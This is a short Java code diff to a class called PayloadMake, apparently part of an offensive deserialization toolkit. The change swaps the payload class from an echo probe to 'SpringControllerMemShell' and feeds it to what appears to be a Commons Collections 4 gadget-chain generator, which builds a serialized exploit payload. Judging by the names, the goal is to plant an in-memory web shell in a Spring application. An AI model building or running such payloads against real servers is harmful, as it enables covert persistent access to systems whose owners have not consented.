@@ -10,7 +10,7 @@ import org.ppp.tools.ser.CC4Generator;
  */
 public class PayloadMake {
     public static void main(String[] args) throws Exception{
-        Class cls = SpringEcho.class;
+        Class cls = SpringControllerMemShell.class;
         CC4Generator cc4Generator = new CC4Generator();
         String payload = cc4Generator.make(cls);
         System.out.println(payload.length());
